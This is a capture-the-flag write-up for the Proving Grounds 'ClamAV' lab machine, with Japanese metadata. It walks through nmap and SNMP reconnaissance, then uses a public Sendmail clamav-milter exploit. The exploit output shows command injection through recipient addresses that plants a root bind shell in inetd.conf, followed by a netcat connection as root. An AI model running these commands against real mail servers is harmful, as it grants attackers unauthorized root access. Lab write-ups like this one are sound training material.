+++
title = " 
 	
Proving Grounds Practice - ClamAV Writeup"
date = "2026-10-07"
description = "ClamAVのclamav-milterの設定を特定、エクスプロイトを使用し、Sendmailのリモートコマンド実行の脆弱性を悪用"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Sendmail with clamav-milter < 0.91.2 - Remote Command Execution ]", "[snmpwalk]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | ClamAV |
| OS | Linux |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- 192.168.208.42
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 23:36 +0900
Nmap scan report for 192.168.208.42
Host is up (0.098s latency).                                                                       
Not shown: 65526 closed tcp ports (reset)                                                          
PORT      STATE    SERVICE     VERSION                                                             
22/tcp    open     ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)                     
| ssh-hostkey:                                                                                     
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)                                     
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open     smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.189], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open     http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open     smux        Linux SNMP multiplexer
445/tcp   open     netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
25424/tcp filtered unknown
60000/tcp open     ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
64721/tcp filtered unknown
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h00m00s, deviation: 2h49m43s, median: 3h59m59s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-10-07T15:03:41-04:00
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1691.23 seconds
```

```bash
nmap -sU 192.168.208.42 
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 00:14 +0900
Nmap scan report for 192.168.208.42
Host is up (0.10s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 1021.45 seconds
```
```bash
snmpwalk -v1 -c public 192.168.208.42 1.3.6.1.2.1.25.4
```
```text
iso.3.6.1.2.1.25.4.2.1.5.3778 = STRING: "--black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl"
```



---

## exploit

```bash
 searchsploit clamav    
```

```text
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer  | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference      | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                    | linux/remote/4862.py
ClamAV < 0.102.0 - 'bytecode_vm' Code Execution                     | linux/local/47687.py
ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)       | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service            | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)   | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Me | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution     | multiple/remote/4761.pl
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------- ---------------------------------
 Paper Title                                                        |  Path
-------------------------------------------------------------------- ---------------------------------
[Azerbaijan] ClamAV Bypassing                                       | docs/azerbaijan/31685-[azerbaija
-------------------------------------------------------------------- ---------------------------------

```

```bash
perl 4761.pl 192.168.208.42  
```

```text
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.208.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 7 Oct 2026 15:49:14 -0400; (No UCE/UBE) logging access from: [192.168.45.189](FAIL)-[192.168.45.189]
250-localhost.localdomain Hello [192.168.45.189], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 697JnETt005246 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

```bash
c -nv 192.168.208.42 31337
```

```text
(UNKNOWN) [192.168.208.42] 31337 (?) open
whoami
root

```


## Summary

Sendmail with clamav-milter < 0.91.2 - Remote Command Execution  → ncで接続 → SYSTEM/root
